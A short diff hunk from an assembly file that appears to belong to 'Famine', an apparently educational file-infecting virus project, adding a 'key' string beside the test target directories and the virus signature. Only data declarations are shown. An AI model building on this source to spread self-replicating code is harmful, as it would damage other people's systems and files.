@@ -461,6 +461,7 @@ _strlen:
 
 dir1        db  "/tmp/test", 0
 dir1Len    equ $ - dir1
+key			db	"buF'Mu.Fk^m7CD0"
 dir2        db  "/tmp/test2", 0
 dir2Len    equ $ - dir2
 signature	db "Famine version 1.0 (c)oded by anvincen-eedy", 0x0
